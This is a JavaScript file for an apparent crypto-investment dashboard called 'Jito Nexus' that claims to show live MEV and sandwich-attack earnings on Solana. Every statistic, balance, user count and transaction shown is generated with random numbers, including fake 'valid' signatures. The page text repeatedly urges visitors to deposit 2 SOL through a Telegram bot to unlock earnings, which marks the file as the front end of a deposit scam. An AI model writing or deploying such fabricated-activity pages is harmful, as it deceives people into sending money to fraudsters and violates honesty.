let currentBalance = 0;
let pooledSol = 10000; // Starting pooled SOL
let sandwichAttacks = 0; // Starting sandwich attacks
let activeUsers = 0;
let ongoingMEV = 0;
let ongoingArbitrage = 0;
let ongoingSandwich = 0;
let ongoingSnipes = 0;
let startTime;
let solGainedChart, solPooledChart, sandwichAttacksChart;
let transactions = [];

console.log("Script loaded");

document.addEventListener("DOMContentLoaded", function() {
    console.log("DOM fully loaded");
    initializeApp();
    setInterval(updateApp, 1000); // Update every second
    setInterval(addNewTransaction, 1000); // Add a new transaction every second
});

function initializeApp() {
    console.log("Initializing app");
    loadSavedData();
    if (!startTime) {
        startTime = new Date();
        currentBalance = Math.random() * (16000 - 145) + 145;
        pooledSol = 10000;
        sandwichAttacks = 0;
        activeUsers = Math.floor(Math.random() * (30000 - 1900) + 1900);
        ongoingMEV = Math.floor(Math.random() * 1000);
        ongoingArbitrage = Math.floor(Math.random() * 500);
        ongoingSandwich = 0;
        ongoingSnipes = 0;
    }
    updateGlobalNexusStats();
    initializeWallet();
    updateMyGains();
    initializeTransactions();
    initializeStatsGraphs();
    explainChartLines();
    showTab('global-nexus-stats'); // Show Global Nexus Stats tab by default
}

function loadSavedData() {
    const savedBalance = localStorage.getItem('currentBalance');
    const savedStartTime = localStorage.getItem('startTime');
    const savedPooledSol = localStorage.getItem('pooledSol');
    const savedSandwichAttacks = localStorage.getItem('sandwichAttacks');
    const savedActiveUsers = localStorage.getItem('activeUsers');
    const savedOngoingMEV = localStorage.getItem('ongoingMEV');
    const savedOngoingArbitrage = localStorage.getItem('ongoingArbitrage');
    const savedOngoingSandwich = localStorage.getItem('ongoingSandwich');
    const savedOngoingSnipes = localStorage.getItem('ongoingSnipes');
    if (savedBalance && savedStartTime && savedPooledSol && savedSandwichAttacks && savedActiveUsers && savedOngoingMEV && savedOngoingArbitrage && savedOngoingSandwich && savedOngoingSnipes) {
        currentBalance = parseFloat(savedBalance);
        startTime = new Date(parseInt(savedStartTime));
        pooledSol = parseFloat(savedPooledSol);
        sandwichAttacks = parseInt(savedSandwichAttacks);
        activeUsers = parseInt(savedActiveUsers);
        ongoingMEV = parseInt(savedOngoingMEV);
        ongoingArbitrage = parseInt(savedOngoingArbitrage);
        ongoingSandwich = parseInt(savedOngoingSandwich);
        ongoingSnipes = parseInt(savedOngoingSnipes);
        console.log("Loaded saved data:", currentBalance, startTime, pooledSol, sandwichAttacks, activeUsers, ongoingMEV, ongoingArbitrage, ongoingSandwich, ongoingSnipes);
    }
}

function saveData() {
    localStorage.setItem('currentBalance', currentBalance.toString());
    localStorage.setItem('startTime', startTime.getTime().toString());
    localStorage.setItem('pooledSol', pooledSol.toString());
    localStorage.setItem('sandwichAttacks', sandwichAttacks.toString());
    localStorage.setItem('activeUsers', activeUsers.toString());
    localStorage.setItem('ongoingMEV', ongoingMEV.toString());
    localStorage.setItem('ongoingArbitrage', ongoingArbitrage.toString());
    localStorage.setItem('ongoingSandwich', ongoingSandwich.toString());
    localStorage.setItem('ongoingSnipes', ongoingSnipes.toString());
    console.log("Saved data:", currentBalance, startTime, pooledSol, sandwichAttacks, activeUsers, ongoingMEV, ongoingArbitrage, ongoingSandwich, ongoingSnipes);
}

function updateApp() {
    const now = new Date();
    if (now - startTime >= 24 * 60 * 60 * 1000) {
        console.log("24 hours passed, resetting");
        startTime = new Date();
        currentBalance = Math.random() * (16000 - 145) + 145;
        pooledSol = 10000;
        sandwichAttacks = 0;
        activeUsers = Math.floor(Math.random() * (30000 - 1900) + 1900);
        ongoingMEV = Math.floor(Math.random() * 1000);
        ongoingArbitrage = Math.floor(Math.random() * 500);
        ongoingSandwich = 0;
        ongoingSnipes = 0;
        transactions = [];
    } else {
        updateGlobalNexusStats();
    }
    saveData();
}

function updateGlobalNexusStats() {
    // Update SOL Gained (more dynamic)
    const gainFactor = Math.random() * 2 + 0.5; // Random factor between 0.5 and 2.5
    currentBalance += gainFactor * (Math.random() * 0.2 + 0.9); // More variation

    // Update pooled SOL (add more jitter)
    const poolChange = (Math.random() - 0.5) * 200; // Increased range of change
    pooledSol += poolChange;
    pooledSol = Math.max(500, Math.min(20000, pooledSol)); // Keep between 500 and 20000

    // Update sandwich attacks (add more jitter)
    const attackChange = Math.floor(Math.random() * 5) - 1; // Can decrease by 1, increase by up to 3
    sandwichAttacks = Math.max(0, sandwichAttacks + attackChange); // Ensure it doesn't go below 0

    // Update new stats
    activeUsers += Math.floor(Math.random() * 11) - 5; // Change by -5 to +5
    activeUsers = Math.max(1900, Math.min(30000, activeUsers)); // Keep between 1900 and 30000
    ongoingMEV += Math.floor(Math.random() * 21) - 10; // Change by -10 to +10
    ongoingMEV = Math.max(0, ongoingMEV);
    ongoingArbitrage += Math.floor(Math.random() * 11) - 5; // Change by -5 to +5
    ongoingArbitrage = Math.max(0, ongoingArbitrage);
    ongoingSandwich += Math.floor(Math.random() * 11) - 5; // Change by -5 to +5
    ongoingSandwich = Math.max(0, ongoingSandwich);
    ongoingSnipes += Math.floor(Math.random() * 11) - 5; // Change by -5 to +5
    ongoingSnipes = Math.max(0, ongoingSnipes);

    console.log("Updating stats, current balance:", currentBalance.toFixed(2));

    document.getElementById("active-users").innerHTML = `Active Users: <span>${activeUsers.toLocaleString()}</span>`;
    document.getElementById("ongoing-mev").innerHTML = `Ongoing MEV: <span>${ongoingMEV.toLocaleString()}</span>`;
    document.getElementById("ongoing-arbitrage").innerHTML = `Ongoing Arbitrage: <span>${ongoingArbitrage.toLocaleString()}</span>`;
    document.getElementById("ongoing-sandwich").innerHTML = `Ongoing Sandwich: <span>${ongoingSandwich.toLocaleString()}</span>`;
    document.getElementById("ongoing-snipes").innerHTML = `Ongoing Snipes: <span>${ongoingSnipes.toLocaleString()}</span>`;
    document.getElementById("sol-balance").textContent = `${currentBalance.toFixed(2)} SOL Gained`;
    document.getElementById("pooled-sol").textContent = `${pooledSol.toFixed(2)} SOL Pooled`;
    document.getElementById("sandwich-attacks").textContent = `${sandwichAttacks} Sandwich Attacks`;
    document.getElementById("stats-description").textContent = 
        `🚀 Jito Nexus Users have collectively earned ${currentBalance.toFixed(2)} SOL today! Watch as the balance grows throughout the day, showcasing the power of MEV strategies. Earnings reset every 24 hours, so keep an eye on the graph to see the real-time impact!`;
    updateStatsGraphs();
}

function initializeWallet() {
    console.log("Initializing wallet");
    document.getElementById("wallet-instructions").innerHTML = 
        "💼 To activate your Jito Nexus wallet and start earning, head over to our bot and type <strong>/get_wallet</strong>. Deposit 2 SOL to activate your wallet and unlock the power of MEV strategies!";
    document.getElementById("wallet-balance").textContent = "Balance: 0.0 SOL";
}

function updateMyGains() {
    console.log("Updating gains");
    const gainsContent = document.getElementById("gains-content");
    gainsContent.innerHTML = `
        <span class="lock-icon">🔒</span>
        <p id="gains-message">To access your gains, please deposit 2 SOL. Head to the bot and type <strong>/get_wallet</strong> to obtain your wallet and make the deposit. Unlock the potential of your earnings once you've activated your account!</p>
    `;
}

function initializeTransactions() {
    for (let i = 0; i < 150; i++) {
        addNewTransaction();
    }
    displayTransactions();
}

function addNewTransaction() {
    const newTransaction = generateTransaction();
    transactions.unshift(newTransaction);
    if (transactions.length > 150) {
        transactions.pop();
    }
    displayTransactions();
}

function generateTransaction() {
    const types = ['transfer', 'swap', 'other'];
    const type = types[Math.floor(Math.random() * types.length)];
    const amount = type === 'transfer' ? (Math.random() * 10).toFixed(4) + ' SOL' : (type === 'swap' ? 'Token Swap' : 'Unknown');
    return {
        type: type,
        amount: amount,
        time: new Date().toLocaleTimeString(),
        fromAddress: generateRandomAddress(),
        toAddress: type === 'transfer' ? generateRandomAddress() : 'N/A',
        signature: generateValidSignature()
    };
}

function generateRandomAddress() {
    return 'Sol' + Math.random().toString(36).substring(2, 10);
}

function generateValidSignature() {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let signature = '';
    for (let i = 0; i < 88; i++) {
        signature += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return signature;
}

function displayTransactions() {
    console.log("Displaying transactions");
    const transactionsList = document.getElementById("transactions-list");
    transactionsList.innerHTML = '';
    transactions.forEach(tx => {
        const txElement = document.createElement('div');
        txElement.className = 'transaction';
        if (tx.type === 'transfer') {
            txElement.innerHTML = `
                <h3>Transfer</h3>
                <p>${tx.amount} transferred at ${tx.time}</p>
                <p>From: ${tx.fromAddress}</p>
                <p>To: ${tx.toAddress}</p>
            `;
        } else if (tx.type === 'swap') {
            txElement.innerHTML = `
                <h3>Swap</h3>
                <p>Token Swap occurred at ${tx.time}</p>
                <p>Initiated by: ${tx.fromAddress}</p>
            `;
        } else {
            txElement.innerHTML = `
                <h3>Other Transaction</h3>
                <p>Unknown transaction type at ${tx.time}</p>
                <p>Initiated by: ${tx.fromAddress}</p>
            `;
        }
        transactionsList.appendChild(txElement);
    });
}

function showTab(tabId) {
    console.log("Showing tab:", tabId);
    const tabs = document.getElementsByClassName("tab-content");
    for (let tab of tabs) {
        tab.style.display = "none";
    }
    document.getElementById(tabId).style.display = "block";
}

function initializeStatsGraphs() {
    console.log("Initializing stats graphs");
    solGainedChart = createChart('sol-gained-chart', 'SOL Gained', 'rgba(0, 255, 255, 1)');
    solPooledChart = createChart('sol-pooled-chart', 'SOL Pooled', 'rgba(255, 0, 0, 1)');
    sandwichAttacksChart = createChart('sandwich-attacks-chart', 'Sandwich Attacks', 'rgba(0, 255, 0, 1)');
}

function createChart(canvasId, label, color) {
    const ctx = document.getElementById(canvasId);
    if (!ctx) {
        console.error(`Canvas element not found: ${canvasId}`);
        return null;
    }
    return new Chart(ctx, {
        type: 'line',
        data: {
            datasets: [{
                label: label,
                data: [],
                borderColor: color,
                borderWidth: 2,
                fill: false,
                pointRadius: 0
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            animation: {
                duration: 0
            },
            scales: {
                x: {
                    type: 'time',
                    time: {
                        unit: 'minute',
                        displayFormats: {
                            minute: 'HH:mm'
                        }
                    },
                    ticks: {
                        color: 'rgba(255, 255, 255, 0.7)',
                        maxRotation: 0,
                        autoSkip: true,
                        maxTicksLimit: 5
                    },
                    grid: {
                        color: 'rgba(255, 255, 255, 0.1)'
                    }
                },
                y: {
                    beginAtZero: false,
                    ticks: {
                        color: 'rgba(255, 255, 255, 0.7)'
                    },
                    grid: {
                        color: 'rgba(255, 255, 255, 0.1)'
                    }
                }
            },
            plugins: {
                legend: {
                    display: true,
                    labels: {
                        color: 'rgba(255, 255, 255, 0.7)',
                        boxWidth: 12,
                        padding: 10
                    }
                },
                tooltip: {
                    mode: 'index',
                    intersect: false
                }
            }
        }
    });
}

function updateStatsGraphs() {
    const now = new Date();
    updateChart(solGainedChart, now, currentBalance);
    updateChart(solPooledChart, now, pooledSol);
    updateChart(sandwichAttacksChart, now, sandwichAttacks);
}

function updateChart(chart, now, value) {
    if (!chart) {
        console.error("Chart not initialized");
        return;
    }
    chart.data.datasets[0].data.push({x: now, y: value});
    if (chart.data.datasets[0].data.length > 100) {
        chart.data.datasets[0].data.shift();
    }
    chart.options.scales.y.max = Math.max(...chart.data.datasets[0].data.map(point => point.y)) * 1.1;
    chart.options.scales.y.min = Math.min(...chart.data.datasets[0].data.map(point => point.y)) * 0.9;
    chart.update();
}

function explainChartLines() {
    const explanation = document.createElement('div');
    explanation.innerHTML = `
        <p style="color: rgba(0, 255, 255, 0.7); font-size: 14px; margin-top: 10px;">The blue chart represents the SOL gained by all users collectively.</p>
        <p style="color: rgba(255, 0, 0, 0.7); font-size: 14px; margin-top: 5px;">The red chart represents the SOL pooled by all users together to perform MEV attacks. This pool fluctuates as users contribute and withdraw funds, and as MEV opportunities are exploited.</p>
        <p style="color: rgba(0, 255, 0, 0.7); font-size: 14px; margin-top: 5px;">The green chart represents the number of successful sandwich attacks performed.</p>
    `;
    document.getElementById('global-nexus-stats').appendChild(explanation);
}

function getWallet() {
    alert("To get your wallet address, please use the Telegram bot and type /get_wallet. Then deposit 2 SOL to start earning!");
}